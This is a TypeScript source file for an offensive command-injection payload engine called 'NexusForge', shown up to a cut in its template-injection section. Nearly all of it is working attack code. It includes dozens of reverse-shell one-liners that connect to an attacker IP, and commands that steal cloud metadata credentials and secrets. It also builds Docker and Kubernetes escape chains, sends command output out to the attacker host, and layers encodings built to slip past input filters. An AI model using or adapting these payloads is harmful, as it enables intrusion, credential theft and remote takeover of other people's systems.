/* ═══════════════════════════════════════════════════════════════════════════
   NEXUSFORGE  —  Professional-Grade Command Injection Engine  v9.0
   ═══════════════════════════════════════════════════════════════════════════ */

const IFS = "${IFS}";
const TAB = "\t";

/* ─── Primitive encoders ─────────────────────────────────────────────────── */
function b64(s: string): string { return Buffer.from(s).toString("base64"); }
function b64url(s: string): string { return Buffer.from(s).toString("base64url"); }
function rawHex(s: string): string { return Buffer.from(s).toString("hex"); }
function hexEsc(s: string): string {
  return [...Buffer.from(s)].map(b => `\\x${(b as number).toString(16).padStart(2,"0")}`).join("");
}
function octEsc(s: string): string {
  return [...Buffer.from(s)].map(b => `\\${(b as number).toString(8).padStart(3,"0")}`).join("");
}
function urlEnc(s: string): string {
  return [...Buffer.from(s)].map(b => `%${(b as number).toString(16).padStart(2,"0").toUpperCase()}`).join("");
}
function dblUrlEnc(s: string): string {
  return [...Buffer.from(s)].map(b => `%25${(b as number).toString(16).padStart(2,"0").toUpperCase()}`).join("");
}
function htmlEnc(s: string): string {
  return [...s].map(c => `&#${c.charCodeAt(0)};`).join("");
}
function charCodes(s: string): string {
  return [...Buffer.from(s)].map(b => (b as number).toString()).join(",");
}
function printfBuild(s: string): string {
  return `$(printf '${hexEsc(s)}')`;
}

/* ─── Random helpers ─────────────────────────────────────────────────────── */
function rnd(lo = 10000, hi = 99999): number { return Math.floor(Math.random() * (hi - lo + 1)) + lo; }
function varName(): string { return `_NX${rnd()}`; }

/* ─── Keyword obfuscators ────────────────────────────────────────────────── */
const SHELL_KEYWORDS = /\b(cat|id|whoami|ls|find|echo|curl|wget|bash|sh|zsh|fish|python3?|perl|ruby|nc|ncat|nmap|awk|sed|grep|tar|base64|openssl|php|java|gcc|hostname|uname|env|passwd|history|ps|kill|rm|cp|mv|chmod|chown|sudo|su|ping|sleep|read|printf|exec|eval|source|export|declare|set|unset|cut|head|tail|sort|uniq|tr|xargs|tee|dd|ip|ifconfig|ss|netstat|ssh|scp|ftp|telnet)\b/g;

function breakKeywords(s: string): string {
  return s.replace(SHELL_KEYWORDS, m => {
    const mid = Math.ceil(m.length / 2);
    return `${m.slice(0, mid)}''${m.slice(mid)}`;
  });
}
function breakKeywordsDQ(s: string): string {
  return s.replace(SHELL_KEYWORDS, m => {
    const mid = Math.ceil(m.length / 2);
    return `${m.slice(0, mid)}""${m.slice(mid)}`;
  });
}
function splitConcat(s: string): string {
  return [...s].map((c, i) => {
    if (!/[a-zA-Z]/.test(c)) return c;
    if (i % 4 === 0) return `"${c}"`;
    if (i % 4 === 2) return `'${c}'`;
    return c;
  }).join("");
}
function varSlice(s: string): string {
  const v = varName();
  return `${v}=${JSON.stringify(s)};eval "$${v}"`;
}

/* ─── Self-target guard ──────────────────────────────────────────────────── */
export function isSelfTarget(url: string): boolean {
  const u = url.trim().toLowerCase();
  let hostname = "";
  try { hostname = new URL(u).hostname.replace(/^\[|\]$/g, ""); } catch { return false; }

  if (
    hostname === "localhost" ||
    hostname === "0.0.0.0" ||
    hostname === "::1" ||
    hostname === "0" ||
    hostname.startsWith("::ffff:127.")
  ) return true;

  const octets = hostname.split(".").map(Number);
  if (octets.length === 4 && octets.every(n => !isNaN(n))) {
    const [a, b] = octets as [number, number, number, number];
    if (a === 127) return true;
    if (a === 10)  return true;
    if (a === 172 && b >= 16 && b <= 31) return true;
    if (a === 192 && b === 168) return true;
    if (a === 169 && b === 254) return true;
    if (a === 0)   return true;
  }

  const renderUrl = (process.env["RENDER_EXTERNAL_URL"] ?? "").toLowerCase().replace(/^https?:\/\//, "").split("/")[0] ?? "";
  if (renderUrl && hostname === renderUrl) return true;

  return false;
}

/* ─── Reverse-shell payloads ─────────────────────────────────────────────── */
export function buildReverseShells(ip: string, port: string): string[] {
  const B64bash = b64(`bash -i >& /dev/tcp/${ip}/${port} 0>&1`);
  const B64py   = b64(`import socket,subprocess,os;s=socket.socket();s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])`);
  return [
    `bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
    `bash -c 'bash -i >& /dev/tcp/${ip}/${port} 0>&1'`,
    `{echo,${B64bash}}|{base64,-d}|bash`,
    `0<&196;exec 196<>/dev/tcp/${ip}/${port};sh <&196 >&196 2>&196`,
    `exec 5<>/dev/tcp/${ip}/${port};cat <&5|while read l;do $l 2>&5 >&5;done`,
    `sh -i >& /dev/udp/${ip}/${port} 0>&1`,
    `python3 -c "$(echo ${B64py}|base64 -d)"`,
    `python3 -c "import socket,subprocess,os;s=socket.socket();s.connect(('${ip}',${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])"`,
    `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
    `ruby -rsocket -e 'c=TCPSocket.new("${ip}","${port}");loop{cmd=c.gets.chomp;c.puts(\`#{cmd} 2>&1\`)}'`,
    `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f`,
    `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ${ip} ${port} >/tmp/f`,
    `nc -e /bin/sh ${ip} ${port}`,
    `nc -e /bin/bash ${ip} ${port}`,
    `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${ip}:${port}`,
    `openssl s_client -quiet -connect ${ip}:${port}|/bin/bash|openssl s_client -quiet -connect ${ip}:${port}`,
    `php -r '$sock=fsockopen("${ip}",${port});proc_open("/bin/sh",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'`,
    `node -e "require('net').connect(${port},'${ip}',function(){var s=require('child_process').spawn('/bin/sh');this.pipe(s.stdin);s.stdout.pipe(this);s.stderr.pipe(this);})"`,
    `awk 'BEGIN{s="/inet/tcp/0/${ip}/${port}";while(1){do{printf "$ "|&s;s|&getline c;if(c){while((c|&getline)>0)print $0|&s;close(c)}}while(c!="exit")close(s)}}'`,
    `exec 196<>/dev/tcp/${ip}/${port};bash <&196 >&196 2>&196`,
    `while :;do bash -i >& /dev/tcp/${ip}/${port} 0>&1;sleep 3;done &`,
    `python3 -c "import pty,socket,os;s=socket.socket();s.connect(('${ip}',${port}));[os.dup2(s.fileno(),i) for i in range(3)];pty.spawn('/bin/bash')"`,
    `python3 -c "import ssl,socket,subprocess as sp;s=ssl.wrap_socket(socket.socket());s.connect(('${ip}',${port}));p=sp.Popen(['/bin/sh'],stdin=s,stdout=s,stderr=s)"`,
    `node -e "const c=require('net').connect(${port},'${ip}');const s=require('child_process').spawn('/bin/sh',['-i']);c.pipe(s.stdin);s.stdout.pipe(c);s.stderr.pipe(c)"`,
    `ncat --ssl ${ip} ${port} -e /bin/bash 2>/dev/null`,
    `socat TCP:${ip}:${port} EXEC:'bash -li',pty,stderr,setsid,sigint,sane`,
    `socat OPENSSL:${ip}:${port},verify=0 EXEC:'bash -li',pty,stderr,setsid,sigint,sane`,
    `mkfifo /tmp/.sf;/bin/sh -i </tmp/.sf 2>&1|openssl s_client -quiet -connect ${ip}:${port} >/tmp/.sf 2>/dev/null;rm /tmp/.sf`,
    `TF=$(mktemp -u);mkfifo $TF && telnet ${ip} ${port} 0<$TF|/bin/sh 1>$TF 2>&1`,
    `busybox nc ${ip} ${port} -e /bin/sh 2>/dev/null`,
    `lua5.1 -e "local s=require('socket');local t=assert(s.tcp());t:connect('${ip}',${port});while true do local r=t:receive();local f=io.popen(r,'r');local b=f:read('*a');f:close();t:send(b);end" 2>/dev/null`,
    `groovy -e 'def c=["bash","-i"].execute();def s=new Socket("${ip}",${port});c.consumeProcessOutput(s.outputStream,s.outputStream);c.waitFor()' 2>/dev/null`,
    `php -r '$s=fsockopen("${ip}",${port});$p=proc_open("/bin/bash",array(0=>$s,1=>$s,2=>$s),$pp);proc_close($p);'`,
    `curl -sfL "http://${ip}:${port}/" 2>/dev/null|sh || wget -qO- "http://${ip}:${port}/" 2>/dev/null|sh`,
    `go run <(printf 'package main\nimport("net";"os/exec")\nfunc main(){c,_:=net.Dial("tcp","%s:%s");x:=exec.Command("/bin/sh","-i");x.Stdin=c;x.Stdout=c;x.Stderr=c;x.Run()}' "${ip}" "${port}") 2>/dev/null`,
    `python3 -c "import pty,os,socket;s=socket.socket();s.connect(('${ip}',${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')" 2>/dev/null`,
    `ruby -rsocket -e 'exit if fork;c=TCPSocket.new("${ip}","${port}");$stdin.reopen(c);$stdout.reopen(c);$stderr.reopen(c);exec "/bin/sh -i"' 2>/dev/null`,
    `php -r '$s=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");' 2>/dev/null`,
    `curl -sk "http://${ip}:${port}/sh" 2>/dev/null|bash`,
    `wget -qO- "http://${ip}:${port}/sh" 2>/dev/null|bash`,
    `nohup bash -c "bash -i >& /dev/tcp/${ip}/${port} 0>&1" 2>/dev/null &`,
    `while :;do bash -i >& /dev/tcp/${ip}/${port} 0>&1;sleep 5;done 2>/dev/null &`,
  ];
}

/* ─── Cloud metadata payloads ───────────────────────────────────────────── */
export function buildCloudMetaPayloads(cmd: string): string[] {
  const aws = "http://169.254.169.254/latest";
  const gcp = "http://metadata.google.internal/computeMetadata/v1";
  const az  = "http://169.254.169.254/metadata/instance?api-version=2021-02-01";
  return [
    `${cmd} && curl -sk ${aws}/meta-data/iam/security-credentials/`,
    `${cmd} && curl -sk ${aws}/meta-data/iam/security-credentials/$(curl -sk ${aws}/meta-data/iam/security-credentials/)`,
    `${cmd} && curl -sk ${aws}/user-data`,
    `${cmd} && curl -sk ${aws}/meta-data/hostname`,
    `${cmd} && curl -sk -H "Metadata-Flavor: Google" ${gcp}/instance/service-accounts/default/token`,
    `${cmd} && curl -sk -H "Metadata-Flavor: Google" ${gcp}/instance/attributes/?recursive=true`,
    `${cmd} && curl -sk -H "Metadata: true" "${az}"`,
    `${cmd} && env | grep -iE 'aws|azure|gcp|google|cloud|key|secret|token|cred'`,
    `${cmd} && cat ~/.aws/credentials 2>/dev/null`,
    `${cmd} && find / -name "*.env" 2>/dev/null | head -5 | xargs cat 2>/dev/null`,
    `${cmd} && printenv | grep -iE 'token|secret|key|pass|cred|auth|api'`,
    /* Oracle Cloud */
    `${cmd} && curl -sk -H "Authorization: Bearer Oracle" http://169.254.169.254/opc/v2/instance/`,
    `${cmd} && curl -sk http://169.254.169.254/opc/v1/instance/`,
    /* DigitalOcean */
    `${cmd} && curl -sk http://169.254.169.254/metadata/v1/`,
    `${cmd} && curl -sk http://169.254.169.254/metadata/v1/user-data`,
    /* Alibaba Cloud */
    `${cmd} && curl -sk http://100.100.100.200/latest/meta-data/`,
    `${cmd} && curl -sk http://100.100.100.200/latest/meta-data/ram/security-credentials/`,
    /* IBM Cloud */
    `${cmd} && curl -sk -H "Metadata-Flavor: ibm" http://169.254.169.254/metadata/v1/`,
    /* Linode */
    `${cmd} && curl -sk http://169.254.169.254/v1.json`,
    /* Hetzner */
    `${cmd} && curl -sk http://169.254.169.254/hetzner/v1/metadata`,
    /* Extra secrets */
    `${cmd} && find / -maxdepth 5 \\( -name '*.pem' -o -name 'id_rsa' -o -name '*.key' \\) 2>/dev/null|head -8`,
    `${cmd} && env | grep -iE 'aws|azure|gcp|cloud|key|secret|token|cred|api|db_|password|mysql|redis|mongo'`,
  ];
}

/* ─── Container escape payloads ─────────────────────────────────────────── */
export function buildContainerEscapes(cmd: string): string[] {
  return [
    `${cmd} && cat /proc/1/cgroup | grep docker`,
    `${cmd} && ls -la /var/run/docker.sock 2>/dev/null && echo DOCKER_SOCK_EXPOSED`,
    `${cmd} && curl -sk --unix-socket /var/run/docker.sock http://localhost/containers/json`,
    `${cmd} && nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash 2>/dev/null`,
    `${cmd} && cat /proc/self/status | grep CapEff`,
    `${cmd} && capsh --print 2>/dev/null`,
    `${cmd} && mount | grep overlay`,
    `${cmd} && cat /run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null`,
    `${cmd} && curl -sk https://kubernetes.default.svc/api/ -H "Authorization: Bearer $(cat /run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)"`,
    /* K8s secret enumeration */
    `${cmd} && TOKEN=$(cat /run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null); curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/secrets 2>/dev/null | python3 -m json.tool 2>/dev/null|head -50`,
    `${cmd} && TOKEN=$(cat /run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null); curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces 2>/dev/null`,
    /* Docker socket */
    `${cmd} && docker run --rm -v /:/host alpine chroot /host id 2>/dev/null`,
    `${cmd} && curl -sk --unix-socket /var/run/docker.sock http://localhost/images/json 2>/dev/null|head -200`,
    `${cmd} && curl -sk --unix-socket /var/run/docker.sock -X POST http://localhost/containers/create -H 'Content-Type: application/json' -d '{"Image":"alpine","Cmd":["/bin/sh","-c","id && cat /host/etc/passwd"],"HostConfig":{"Binds":["/:/host"],"Privileged":true}}' 2>/dev/null`,
    /* Capabilities check */
    `${cmd} && capsh --print 2>/dev/null|grep -E 'cap_sys_admin|cap_net_admin|cap_sys_ptrace|cap_dac_read_search'`,
    `${cmd} && getpcaps 1 2>/dev/null`,
    /* Privileged cgroup escape */
    `${cmd} && mkdir -p /tmp/nx_cg 2>/dev/null; mount -t cgroup -o memory cgroup /tmp/nx_cg 2>/dev/null && echo 1 > /tmp/nx_cg/notify_on_release 2>/dev/null && echo '#!/bin/sh\nid > /tmp/nx_pwn' > /tmp/nx_release 2>/dev/null && chmod +x /tmp/nx_release 2>/dev/null && echo /tmp/nx_release > /tmp/nx_cg/release_agent 2>/dev/null`,
    /* Environment probe */
    `${cmd} && env | grep -iE 'docker|kube|k8s|container|pod|namespace|cluster|secret|token|ca_cert'`,
  ];
}

/* ═══════════════════════════════════════════════════════════════════════════
   CORE: applyQuantumBypass
   ═══════════════════════════════════════════════════════════════════════════ */
export function applyQuantumBypass(
  cmd: string,
  mode: string,
  attackerIp  = "127.0.0.1",
  attackerPort = "4444",
): string {
  if (!cmd) return "";
  const raw   = String(cmd).trim();
  const B64   = b64(raw);
  const B64x2 = b64(B64);
  const B64x3 = b64(B64x2);
  const B64x4 = b64(B64x3);
  const B64u  = b64url(raw);
  const HEX   = hexEsc(raw);
  const OCT   = octEsc(raw);
  const RHEX  = rawHex(raw);
  const words = raw.split(/\s+/);
  const bin0  = words[0] ?? "id";
  const args  = words.slice(1).join(" ");

  switch (mode) {

    case "classic": return raw;

    case "blind": {
      const v = varName();
      return [
        `${v}=$SECONDS`,
        `{ ${raw}; } 2>&1`,
        `_NX_E=$?`,
        `{ sleep 7; } 2>/dev/null`,
        `|| { ping -c 7 127.0.0.1 >/dev/null 2>&1; }`,
        `|| { python3 -c "import time;time.sleep(7)" 2>/dev/null; }`,
        `|| { perl -e "sleep 7" 2>/dev/null; }`,
        `|| { node -e "setTimeout(()=>{},7e3)" 2>/dev/null; }`,
        `|| { ruby -e "sleep 7" 2>/dev/null; }`,
        `echo "[nx:blind|exit=$_NX_E|elapsed=$((SECONDS-${v}))s]"`,
      ].join("; ");
    }

    case "oob": {
      const B64cmd = b64(raw);
      return (
        `_NX_O=$(${raw} 2>&1); ` +
        `_NX_B=$(printf '%s' "$_NX_O"|base64 -w0 2>/dev/null||printf '%s' "$_NX_O"|base64 2>/dev/null); ` +
        `curl -sk -m8 -X POST "http://${attackerIp}:${attackerPort}/nx" ` +
          `-H "X-NX-Cmd:${B64cmd}" -H "X-NX-Host:$(hostname)" ` +
          `--data-urlencode "d=$_NX_O" >/dev/null 2>&1 & ` +
        `wget -qO/dev/null --timeout=8 --post-data="b=$_NX_B" "http://${attackerIp}:${attackerPort}/nx" 2>/dev/null & ` +
        `nslookup "$(printf '%s' "$_NX_O"|head -c16|tr -cd '[:alnum:]').oob.${attackerIp}" >/dev/null 2>&1 & ` +
        `dig +short "@${attackerIp}" "$(printf '%s' "$_NX_O"|head -c30|tr -cd '[:alnum:]').nx" 2>/dev/null & ` +
        `python3 -c "import urllib.request as r,base64,os;` +
          `r.urlopen(r.Request('http://${attackerIp}:${attackerPort}/nx',` +
          `data=base64.b64encode(os.popen(${JSON.stringify(raw)}).read(4096).encode()),` +
          `headers={'X-NX':'${B64cmd}'}))" 2>/dev/null & ` +
        `printf '%s\\n' "$_NX_O"`
      );
    }

    case "quantum": {
      const jv  = () => `_v${rnd()}`;
      const nop = (): string => {
        const opts = [
          `${jv()}=${rnd()}`,
          `${jv()}=$((${rnd(1, 99)}*${rnd(1, 9)}))`,
          `true`,
          `:`,
          `test ${rnd()} -ne ${rnd()}`,
          `${jv()}=$(printf '%d' ${rnd()})`,
        ];
        return opts[Math.floor(Math.random() * opts.length)]!;
      };
      return [
        `${jv()}=${rnd()};{ {echo,${B64}}|{base64,-d}|bash; } 2>/dev/null`,
        `|| { ${nop()};eval "$(printf '${HEX}')"; } 2>/dev/null`,
        `|| { ${nop()};eval "$(printf '${OCT}')"; } 2>/dev/null`,
        `|| { ${jv()}=${rnd()};bash<<<$(echo${TAB}${B64}|base64${TAB}-d); } 2>/dev/null`,
        `|| { ${nop()};$(printf '\\x2f\\x62\\x69\\x6e\\x2f\\x62\\x61\\x73\\x68') -c "$(printf '${HEX}')"; } 2>/dev/null`,
        `|| { ${jv()}=${rnd()};python3 -c "import base64,os;os.system(base64.b64decode('${B64}').decode())"; } 2>/dev/null`,
        `|| { ${nop()};perl -e "system(pack('H*','${RHEX}'))"; } 2>/dev/null`,
        `|| { ${jv()}=${rnd()};ruby -e "require 'base64';system(Base64.decode64('${B64}'))"; } 2>/dev/null`,
        `|| { ${nop()};node -e "require('child_process').execSync(Buffer.from('${B64}','base64').toString(),{stdio:'inherit'})"; } 2>/dev/null`,
        `|| { ${jv()}=${rnd()};bash<<<$(echo "${B64x2}"|base64 -d|base64 -d); } 2>/dev/null`,
        `|| { ${nop()};bash<<<$(echo "${B64x3}"|base64 -d|base64 -d|base64 -d); } 2>/dev/null`,
        `|| { ${jv()}=${rnd()};bash<<<$(echo "${B64x4}"|base64 -d|base64 -d|base64 -d|base64 -d); } 2>/dev/null`,
        `|| { ${nop()};echo ${RHEX}|xxd -r -p|bash; } 2>/dev/null`,
        `|| { ${jv()}=${rnd()};printf '${OCT}'|bash; } 2>/dev/null`,
      ].join(" ");
    }

    case "ifs": {
      const ifsRaw = raw.replace(/ /g, IFS);
      const ifsTab = raw.replace(/ /g, TAB);
      const ifsNl  = raw.replace(/ /g, "$'\\n'");
      return [
        `{ ${ifsRaw}; } 2>/dev/null`,
        `|| { IFS=,; set -- ${words.join(",")}; "$@"; } 2>/dev/null`,
        `|| { ${ifsTab}; } 2>/dev/null`,
        `|| { bash${IFS}-c${IFS}${JSON.stringify(raw)}; } 2>/dev/null`,
        `|| { IFS=$'\\n\\t ';${ifsNl}; } 2>/dev/null`,
        `|| { ${raw.replace(/ /g, "${IFS:0:1}")}; } 2>/dev/null`,
        `|| eval${IFS}$(echo${IFS}${B64}|base64${IFS}-d) 2>/dev/null`,
        `|| { X=${JSON.stringify(raw)};IFS=' ';eval $X; } 2>/dev/null`,
      ].join(" ");
    }

    case "concat": {
      const broken   = breakKeywords(raw);
      const brokenDQ = breakKeywordsDQ(raw);
      const splitC   = splitConcat(raw);
      const sq       = raw.replace(/([a-z])([a-z]{2})/g, (_, a, bc) => `${a}''${bc}`);
      return [
        `{ ${broken}; } 2>/dev/null`,
        `|| { ${brokenDQ}; } 2>/dev/null`,
        `|| { ${splitC}; } 2>/dev/null`,
        `|| { ${sq}; } 2>/dev/null`,
        `|| { ${varSlice(raw)}; } 2>/dev/null`,
        `|| { _a=${JSON.stringify(bin0.slice(0,2))};_b=${JSON.stringify(bin0.slice(2))};_c="$_a$_b";$_c ${args}; } 2>/dev/null`,
      ].join(" ");
    }

    case "hex":
      return [
        `eval "$(printf '${HEX}')" 2>/dev/null`,
        `|| { _NX="$(printf '${HEX}')"; eval "$_NX"; } 2>/dev/null`,
        `|| perl -e "system(pack('H*','${RHEX}'))" 2>/dev/null`,
        `|| python3 -c "import os;os.system(bytes.fromhex('${RHEX}').decode())" 2>/dev/null`,
        `|| echo ${RHEX}|xxd -r -p|bash 2>/dev/null`,
        `|| { printf '${HEX}'|bash; } 2>/dev/null`,
        `|| node -e "require('child_process').execSync(Buffer.from('${RHEX}','hex').toString(),{stdio:'inherit'})" 2>/dev/null`,
        `|| ruby -e "system([${charCodes(raw)}].pack('C*'))" 2>/dev/null`,
        `|| bash -c "$(printf '%b' '${HEX}')" 2>/dev/null`,
        `|| { _h=$(printf '${HEX}');bash -c "$_h"; } 2>/dev/null`,
      ].join(" ");

    case "b64loop":
      return [
        `bash<<<$(echo${TAB}${B64}|base64${TAB}-d) 2>/dev/null`,
        `|| { _a="${B64x2}";bash<<<$(echo "$_a"|base64 -d|base64 -d); } 2>/dev/null`,
        `|| { bash<<<$(echo "${B64x3}"|base64 -d|base64 -d|base64 -d); } 2>/dev/null`,
        `|| { bash<<<$(echo "${B64x4}"|base64 -d|base64 -d|base64 -d|base64 -d); } 2>/dev/null`,
        `|| {echo,${B64}}|{base64,-d}|{bash,} 2>/dev/null`,
        `|| perl -MMIME::Base64 -e "system(decode_base64('${B64}'))" 2>/dev/null`,
        `|| python3 -c "import base64 as b,os;os.system(b.b64decode(b.b64decode('${B64x2}')).decode())" 2>/dev/null`,
        `|| echo ${B64u}|python3 -c "import sys,base64,os;os.system(base64.urlsafe_b64decode(sys.stdin.read().strip()).decode())" 2>/dev/null`,
      ].join(" ");

    case "env": {
      const v1 = varName(); const v2 = varName(); const v3 = varName();
      return [
        `${v1}=${JSON.stringify(raw)};bash -c "$${v1}" 2>/dev/null`,
        `|| { ${v2}=${JSON.stringify(bin0)};${v3}=${JSON.stringify(args)};"$${v2}" $${v3}; } 2>/dev/null`,
        `|| { export ${v1}=${JSON.stringify(raw)};eval "$${v1}"; } 2>/dev/null`,
        `|| { declare ${v1}=${JSON.stringify(raw)};eval "$${v1}"; } 2>/dev/null`,
        `|| env ${v1}=${JSON.stringify(raw)} bash -c "eval \\$$${v1}" 2>/dev/null`,
        `|| BASH_ENV=/dev/stdin bash <<<${JSON.stringify(raw)} 2>/dev/null`,
        `|| { read ${v1}<<<${JSON.stringify(raw)};bash -c "$${v1}"; } 2>/dev/null`,
      ].join(" ");
    }

    case "heredoc": {
      const mk = `NX${rnd()}`;
      return [
        `bash<<'${mk}'\n${raw}\n${mk}`,
        `bash<<${mk}\n${raw}\n${mk}`,
        `sh<<'NXEOF'\n${raw}\nNXEOF`,
        `python3<<'PYEOF'\nimport os\nos.system(${JSON.stringify(raw)})\nPYEOF`,
        `perl<<'PLEOF'\nsystem(${JSON.stringify(raw)});\nPLEOF`,
        `ruby<<'RBEOF'\nsystem(${JSON.stringify(raw)})\nRBEOF`,
        `node<<'JSEOF'\nrequire('child_process').execSync(${JSON.stringify(raw)},{stdio:'inherit'});\nJSEOF`,
      ].join("\n");
    }

    case "unicode": {
      const hexPrint = raw.replace(/[a-zA-Z]/g,
        c => `$(printf '\\x${c.charCodeAt(0).toString(16).padStart(2,"0")}')`
      );
      return [
        `{ ${hexPrint}; } 2>/dev/null`,
        `|| { $(printf '${HEX}'); } 2>/dev/null`,
        `|| bash -c "$(printf '%b' '${HEX}')" 2>/dev/null`,
        `|| { eval "$(printf '${HEX}')"; } 2>/dev/null`,
        `|| printf '${HEX}'|bash 2>/dev/null`,
        `|| { printf '%b' '${OCT}'|bash; } 2>/dev/null`,
        `|| python3 -c "import os;os.system(bytes([${charCodes(raw)}]).decode())" 2>/dev/null`,
      ].join(" ");
    }

    case "null":
      return [
        `{ ${raw}$'\\x00'; } 2>/dev/null`,
        `|| bash -c "${raw.replace(/"/g, '\\"')}$'\\x00'" 2>/dev/null`,
        `|| { printf '${HEX}\\x00'|bash; } 2>/dev/null`,
        `|| python3 -c "import os;os.system(${JSON.stringify(raw)}+chr(0))" 2>/dev/null`,
      ].join(" ");

    case "wildcard": {
      const globBin = bin0.replace(/[aeiou]/gi, "?");
      return [
        `{ /???/b??h -c ${JSON.stringify(raw)}; } 2>/dev/null`,
        `|| { /???/b??h<<<$(echo${TAB}${B64}|base64${TAB}-d); } 2>/dev/null`,
        `|| { /???/${globBin} ${args}; } 2>/dev/null`,
        `|| { /[b][i][n]/[b][a][s][h] -c ${JSON.stringify(raw)}; } 2>/dev/null`,
        `|| { ls /b??/* 2>/dev/null|head -1|xargs -I{} {} -c ${JSON.stringify(raw)}; } 2>/dev/null`,
        `|| { $(ls /bin/b* 2>/dev/null|head -1) -c ${JSON.stringify(raw)}; } 2>/dev/null`,
        `|| { /???/b??h -c "$(printf '${HEX}')"; } 2>/dev/null`,
      ].join(" ");
    }

    case "comment": {
      const poundBreak = words.join(" #\\\n");
      return [
        `{ ${poundBreak}; } 2>/dev/null`,
        `|| { ${raw.replace(/ /g, "/**/")}; } 2>/dev/null`,
        `|| bash -c $'${raw.replace(/\\/g, "\\\\").replace(/'/g, "\\'").replace(/ /g, " #\\n")}' 2>/dev/null`,
        `|| { ${words.join("; : ;\n")}; } 2>/dev/null`,
      ].join(" ");
    }

    case "double_enc":
      return [
        `bash -c "$(printf '%b' '${HEX}')" 2>/dev/null`,
        `|| { eval $(printf '%b' '${HEX}'); } 2>/dev/null`,
        `|| bash<<<$(printf '%b' '${HEX}') 2>/dev/null`,
        `|| printf '%b' '${HEX}'|bash 2>/dev/null`,
        `|| eval "$(echo '${B64x2}'|base64 -d|base64 -d)" 2>/dev/null`,
        `|| { _x=$(printf '%b' '${HEX}');eval "$_x"; } 2>/dev/null`,
      ].join(" ");

    case "brace": {
      const charRange = [...bin0].map(c => `{${c},}`).join("");
      return [
        `{ {echo,${B64}}|{base64,-d}|{bash,}; } 2>/dev/null`,
        `|| { {b,}a{s,}h -c ${JSON.stringify(raw)}; } 2>/dev/null`,
        `|| { {/bin/,}bash -c ${JSON.stringify(raw)}; } 2>/dev/null`,
        `|| { ${charRange}${IFS}${args}; } 2>/dev/null`,
        `|| { {b,}a{s,}h<<<$(echo${IFS}${B64}|{base64,-d}); } 2>/dev/null`,
        `|| { {echo,$(echo${IFS}${B64})}|{base64,-d}|{bash,}; } 2>/dev/null`,
      ].join(" ");
    }

    case "process_sub":
      return [
        `bash <(echo ${B64}|base64 -d) 2>/dev/null`,
        `|| source <(echo ${B64}|base64 -d) 2>/dev/null`,
        `|| . <(echo ${B64}|base64 -d) 2>/dev/null`,
        `|| bash <(printf '${HEX}') 2>/dev/null`,
        `|| bash <(printf '%b' '${HEX}') 2>/dev/null`,
        `|| eval <(echo ${B64}|base64 -d) 2>/dev/null`,
        `|| bash <(python3 -c "import base64;print(base64.b64decode('${B64}').decode())") 2>/dev/null`,
      ].join(" ");

    case "arith": {
      const chrBuild = `$(for _c in ${charCodes(raw)};do printf "\\\\$(printf '%03o' $_c)";done)`;
      return [
        `{ bash -c "$(printf '${HEX}')"; } 2>/dev/null`,
        `|| { ${chrBuild}; } 2>/dev/null`,
        `|| python3 -c "import os;os.system(bytes([${charCodes(raw)}]).decode())" 2>/dev/null`,
        `|| node -e "require('child_process').execSync(String.fromCharCode(${charCodes(raw)}),{stdio:'inherit'})" 2>/dev/null`,
        `|| perl -e "system(chr(${charCodes(raw).replace(/,/g,").chr(")}))" 2>/dev/null`,
      ].join(" ");
    }

    case "ansi_c": {
      const ansiEsc = [...raw].map(c => {
        const code = c.charCodeAt(0);
        if (c === "'") return "\\'";
        if (c === "\\") return "\\\\";
        if (code < 0x20 || code > 0x7e) return `\\x${code.toString(16).padStart(2,"0")}`;
        return c;
      }).join("");
      const hexAnsi = [...Buffer.from(raw)].map(b => `\\x${(b as number).toString(16).padStart(2,"0")}`).join("");
      const octAnsi = [...Buffer.from(raw)].map(b => `\\${(b as number).toString(8).padStart(3,"0")}`).join("");
      return [
        `bash -c $'${ansiEsc}' 2>/dev/null`,
        `|| eval $'${hexAnsi}' 2>/dev/null`,
        `|| bash -c $'${hexAnsi}' 2>/dev/null`,
        `|| eval $'${octAnsi}' 2>/dev/null`,
        `|| { _c=$'${hexAnsi}';eval "$_c"; } 2>/dev/null`,
      ].join(" ");
    }

    case "rev": {
      const reversed = raw.split("").reverse().join("");
      const B64rev   = b64(reversed);
      return [
        `echo ${JSON.stringify(reversed)}|rev|bash 2>/dev/null`,
        `|| bash -c "$(echo ${B64rev}|base64 -d|rev)" 2>/dev/null`,
        `|| python3 -c "import os;os.system(${JSON.stringify(reversed)}[::-1])" 2>/dev/null`,
        `|| perl -e "system(scalar reverse ${JSON.stringify(reversed)})" 2>/dev/null`,
        `|| node -e "require('child_process').execSync(${JSON.stringify(reversed)}.split('').reverse().join(''),{stdio:'inherit'})" 2>/dev/null`,
      ].join(" ");
    }

    case "ssti": {
      const e = raw.replace(/'/g, "\\'").replace(/"/g, '\\"');
      return [
        `{{config.__class__.__init__.__globals__['os'].popen('${e}').read()}}`,
        `{{lipsum.__globals__['os'].popen('${e}').read()}}`,
        `{{cycler.__init__.__globals__.os.popen('${e}').read()}}`,
        `{{joiner.__init__.__globals__.os.popen('${e}').read()}}`,
        `{{namespace.__init__.__globals__.os.popen('${e}').read()}}`,
